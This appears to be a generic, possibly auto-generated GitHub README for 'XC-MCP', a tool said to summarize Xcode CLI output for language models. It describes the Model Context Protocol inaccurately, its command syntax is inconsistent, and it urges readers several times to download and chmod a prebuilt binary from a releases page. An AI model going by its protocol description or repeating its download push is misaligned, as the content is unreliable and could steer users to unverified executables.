[![Latest Release](https://img.shields.io/badge/xc-mcp-releases-green?style=for-the-badge)](https://github.com/ ericvoltolin/xc-mcp/releases)
https://github.com/ericvoltolin/xc-mcp/releases

# XC-MCP: Lean Xcode CLI Wrapper to Cut LLM Token Usage

🚀 XCode CLI MCP is a convenient wrapper for Xcode CLI tools. It shortens long outputs by summarizing them, helping reduce token usage when interacting with language models. It keeps your workflow smooth while you focus on code, builds, and diagnostics.

![XCode MCP Banner](https://upload.wikimedia.org/wikipedia/commons/1/1b/Xcode_icon.png)

Table of Contents
- Why XC-MCP
- Core ideas and concepts
- Features
- How it works
- Getting started
- Installation
- Quick start guide
- CLI reference
- Model Context Protocol
- Architecture and components
- How to contribute
- Roadmap
- License and credits
- Frequently asked questions

Why XC-MCP
- You work with Xcode CLI tools daily. The outputs can be verbose and noisy.
- You want fewer tokens when you feed logs and commands into an LLM.
- You need a reliable wrapper that can summarize, filter, and structure CLI results.
- You want a simple tool that stays out of your way and focuses on your code.

Core ideas and concepts
- Convenience wrapper: It sits on top of the standard Xcode command line tools, adding a friendly layer that surfaces essential information.
- Output summarization: Long CLI outputs get converted into concise, context-rich summaries.
- Model-context friendly: The wrapper prepares compact prompts that preserve meaning and intent for LLMs.
- Extensible: The architecture supports multiple “contexts” and adapters, enabling easy integration with different tooling chains.
- Local-first by default: Summaries and context data stay on your machine unless you opt-in to share.

Features
- Lightweight CLI with sensible defaults
- Summarize long build logs, test results, and diagnostic outputs
- Preserve critical details like errors, warnings, and stack traces in a compact form
- Easy to extend with a Model Context Protocol
- Shop-friendly design for local development and CI pipelines
- Clear, actionable prompts for LLMs without large token bloat
- Simple, deterministic outputs for automation and scripting
- Supports common Xcode workflows and tooling ecosystems

How it works
- Wraps Xcode CLI calls
- Captures standard output and standard error
- Applies a summarization step that preserves key signals (errors, failures, durations)
- Produces concise context blocks suitable for LLM prompts
- Exposes a clean CLI for quick operations and a modular codebase for expansion

Model Context Protocol
- The Model Context Protocol defines how to structure data for models.
- It focuses on keeping prompts short while carrying enough signal for accurate responses.
- Context blocks include:
  - Problem statement or goal
  - Key outputs (summaries of logs)
  - Critical signals (errors, timeouts, warnings)
  - Optional metadata (timestamps, IDs)
- Implementations can adapt to different LLMs, languages, or prompt formats.
- The protocol is designed to be simple to extend, so you can add your own adapters without breaking existing behavior.

Architecture and components
- Core wrapper: The main entry point for interacting with Xcode CLI tools.
- Summarization module: A deterministic algorithm that reduces lengthy outputs to compact summaries.
- Context builder: Gathers necessary signals and formats them for your chosen model.
- Plugin/adapter layer: Allows adding new commands, outputs, or integration points without changing core logic.
- Server module (optional): A lightweight service to coordinate multiple XC-MCP clients or tools.
- Tools and Xcode integration: Bridges to common Xcode CLI commands (build, test, archive, run, etc.)
- Data model: Simple, human-readable, versioned structures for outputs and summaries.

Getting started
- Prerequisites
  - macOS with Xcode Command Line Tools installed
  - A working Xcode installation and access to xcodebuild or other standard CLI tools
  - Basic familiarity with terminal usage and JSON or plain-text logs
- What you’ll get
  - A single, focused CLI tool to execute Xcode commands and receive concise outputs
  - A clean path to integrate with LLM prompts and model contexts
  - A foundation for automations that rely on minimal, meaningful outputs
- How to prepare your environment
  - Ensure your macOS user has the necessary permissions to run Xcode CLI tools
  - Ensure your PATH includes the directory where XC-MCP binaries reside
  - If you download a prebuilt release, make the binary executable and place it in a sensible location
- Release notes and assets
  - See the latest release for prebuilt assets and installation details: https://github.com/ericvoltolin/xc-mcp/releases
  - If you have trouble with the link, check the Releases section for the latest assets and guidance

Installation
- From a release asset (recommended)
  - Download the latest asset from the Releases page
  - Make the asset executable
  - Move it to a directory in your PATH, for example:
    - mv xc-mcp-macos ~/bin/xc-mcp
    - chmod +x ~/bin/xc-mcp
- From source (advanced)
  - Clone the repository
  - Build the project using the provided toolchain and follow the build steps in the contributing guide
  - Install the built binary to a PATH directory
- Verification
  - Run: xc-mcp --version
  - Expect a version string and help text if installed correctly
- What to install if you don’t see a binary for your platform
  - Check the Releases page for assets tailored to your OS
  - Build from source if you have development tools installed

Quick start guide
- Basic usage
  - xc-mcp build -scheme YourApp -destination "generic/platform=iOS" --summary
  - xc-mcp test -scheme YourApp -destination "generic/platform=iOS" --summary
  - xc-mcp archive -scheme YourApp -destination "generic/platform=iOS" --summary
- Output behavior
  - The tool prints a concise summary of the action results
  - Key messages like errors and failures are highlighted
  - Non-critical messages are condensed to keep the focus on issues that matter
- Context-aware prompts
  - The tool can emit a compact context block suitable for LLM prompts
  - You can reuse this context for continuous prompts or model-driven workflows
- Example session
  - User: xc-mcp build -scheme MyApp -destination "generic/platform=iOS" --summary
  - XC-MCP: Summary of build outputs, errors, and warnings with compact signals
  - User: xc-mcp summarize-context --format json
  - XC-MCP: Returns a JSON block containing the condensed context for your model

CLI reference
- Global options
  - --help show help for commands
  - --version print version
- Common commands
  - build: Run a build for a given scheme and destination
  - test: Run tests for a given scheme and destination
  - archive: Create an archive for distribution
  - run: Execute a run action for a specific target
  - summarize: Produce a concise summary of a given log or output
  - context: Output the current model context or a new context based on recent outputs
- Example commands
  - xc-mcp build --scheme App --destination "generic/platform=iOS"
  - xc-mcp test --scheme AppTests --destination "generic/platform=iOS"
  - xc-mcp summarize --input /path/to/log.txt --format short
  - xc-mcp context --format compact

Model Context Protocol details
- The protocol defines a minimal interface for passing structured data to LLMs.
- Core fields
  - goal: What you want to achieve
  - signals: Crucial outcomes from the CLI run (errors, failures, durations)
  - summary: A concise narrative of what happened
  - metadata: Timestamps, identifiers, and environment hints
- Extensibility
  - You can add fields for model-specific prompts or prompts tailored to different LLMs
  - Adapters can implement transformation rules to fit various model formats
- Practical examples
  - promt: "Summarize the build results for App with emphasis on errors and time."
  - signals: [{ type: "error", message: "CodeSign error" }, { type: "warning", message: "Deprecated API usage" }]
  - summary: "Build failed due to signing issue. Warning about deprecated API usage. Duration: 2m45s."
- Why this matters
  - Short, signal-rich prompts lead to faster responses from LLMs
  - Clear context improves reliability of model-driven decisions
  - Consistency across projects helps teams scale their AI-assisted workflows

Architecture and design notes
- Modularity
  - The core wrapper and the summarization logic are separate components
  - A pluggable adapter layer enables new commands without core changes
- Determinism
  - Summaries are produced by a deterministic process to ensure repeatability
- Local-first by default
  - All processing can run offline; nothing leaves your machine unless you opt-in
- Testing and quality
  - Unit tests cover core summarization and context-building logic
  - Integration tests exercise common Xcode workflows
- Performance considerations
  - The summarization step is lightweight and designed to run quickly on developer machines
  - Context blocks are kept compact to maximize model efficiency

Contributing
- How to contribute
  - Fork the repository and create a feature branch
  - Add tests for new features
  - Keep changes small and well-scoped
  - Write clear, direct commit messages
- Guidelines
  - Follow consistent coding style
  - Document new APIs and behaviors
  - Add examples to demonstrate new capabilities
- Testing locally
  - Run the test suite
  - Verify that CLI outputs remain readable after summarization

Roadmap
- Future improvements
  - Expand the Model Context Protocol with richer signal types
  - Add more adapters for different Xcode workflows
  - Improve cross-platform compatibility where feasible
  - Enhance logging and traceability for auditing purposes
- Community goals
  - Grow a small ecosystem of adapters for various LLMs
  - Build a small ecosystem of sample prompts and templates
  - Improve documentation with more tutorials and real-world examples

License and credits
- License: MIT
- Credits
  - Maintainers and contributors who fostered a simple, reliable tool for Xcode CLI workflows
  - The project draws on common CLI patterns and standard Xcode tools
- Acknowledgments
  - The open-source community for tools that make local development smoother
  - Early adopters who provided feedback and ideas

Frequently asked questions
- What platforms does XC-MCP support?
  - macOS with Xcode CLI tools. The project aims to run primarily on macOS desktops and CI agents with macOS runners.
- Do I need an internet connection to use XC-MCP?
  - Basic usage works offline. Some features that involve model prompts or remote services may require connectivity.
- How does the summarization affect error details?
  - The summarization preserves the critical signals needed to diagnose issues while removing verbose boilerplate.
- Can I customize the prompts sent to LLMs?
  - Yes. The Model Context Protocol is designed to be extended with your own prompts and formatting rules.
- Where can I find release notes?
  - Check the Releases page for the latest assets, notes, and download instructions.

Releases and downloads
- The Releases page hosts prebuilt binaries and assets for different platforms. If you prefer a quick setup, download the macOS binary from the Releases page and follow the installation steps above.
- If the link to releases changes or you need the latest assets, refer to the Releases section on the repository for the most up-to-date information and assets.

Topics
- cli-mcp
- ios-mcp
- mcp
- mcp-server
- mcp-tools
- mcp-xcode
- model-context-protocol
- xcode
- xcode-mcp
- xcode-tools

Note: For the latest updates, check the Releases page frequently. If you have trouble accessing the link, head to the Releases section of the repository to locate the newest assets and installation instructions.